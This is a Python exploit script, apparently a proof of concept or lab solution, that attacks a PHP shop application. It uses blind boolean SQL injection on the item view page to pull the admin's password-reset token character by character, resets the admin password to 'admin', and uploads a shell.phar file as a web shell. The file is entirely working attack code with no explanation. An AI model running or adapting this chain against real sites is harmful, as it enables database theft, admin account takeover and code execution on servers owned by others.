import requests
import sys


def sql():
    global token
    token = ""
    for digit in range(1,50):
        for char in range(1, 150):
            burp0_url = "http://127.0.0.1:80/item/viewItem.php?id=1+and+ascii(substring((select+token+from+user+where+id_level%3d1+limit+0,1),"+str(digit)+",1))="+str(char)
            burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
                             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                             "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                             "Upgrade-Insecure-Requests": "1"}
            req = requests.get(burp0_url, headers=burp0_headers)
            if req.status_code == 404:
                token += str(chr(char))
                sys.stdout.write(str(chr(char)))
                sys.stdout.flush()
    print("\n\nAdmin token > "+token)

#############################

def resetpass():
	print("Waiting: Reset admin password")
	burp0_url = "http://127.0.0.1:80/login/doChangePassword.php?token="+token
	burp0_cookies = {"PHPSESSID": "ia2uhpvluhr5tjoho672gaurgq"}
	burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
					 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
					 "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
					 "Upgrade-Insecure-Requests": "1"}
	requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
def newpass():
	burp0_url = "http://127.0.0.1:80/login/doChangePassword.php"
	burp0_cookies = {"PHPSESSID": "ia2uhpvluhr5tjoho672gaurgq"}
	burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
					 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
					 "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
					 "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://127.0.0.1",
					 "Connection": "close",
					 "Referer": "http://127.0.0.1/login/doResetPassword.php?token="+token,
					 "Upgrade-Insecure-Requests": "1"}
	burp0_data = {"token": ""+ token+"", "password": "admin"}
	requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
	print("Your new password: admin")

def shellupload():

	burp0_url = "http://127.0.0.1:80/item/updateItem.php"
	burp0_cookies = {"PHPSESSID": "ia2uhpvluhr5tjoho672gaurgq"}
	burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
					 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
					 "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
					 "Content-Type": "multipart/form-data; boundary=---------------------------424639016342351774552597611410",
					 "Origin": "http://127.0.0.1", "Connection": "close",
					 "Referer": "http://127.0.0.1/item/editItem.php?id=1", "Upgrade-Insecure-Requests": "1"}
	burp0_data = "-----------------------------424639016342351774552597611410\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n1\r\n-----------------------------424639016342351774552597611410\r\nContent-Disposition: form-data; name=\"id_user\"\r\n\r\n1\r\n-----------------------------424639016342351774552597611410\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\nRaspery Pi 4\r\n-----------------------------424639016342351774552597611410\r\nContent-Disposition: form-data; name=\"image\"; filename=\"shell.phar\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php ?>\n\r\n-----------------------------424639016342351774552597611410\r\nContent-Disposition: form-data; name=\"description\"\r\n\r\nLatest Raspberry Pi 4 Model B with 2/4/8GB RAM raspberry pi 4 BCM2711 Quad core Cortex-A72 ARM v8 1.5GHz Speeder Than Pi 3B\r\n-----------------------------424639016342351774552597611410\r\nContent-Disposition: form-data; name=\"price\"\r\n\r\n92\r\n-----------------------------424639016342351774552597611410--\r\n"
	requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)


sql()
resetpass()
newpass()
shellupload()
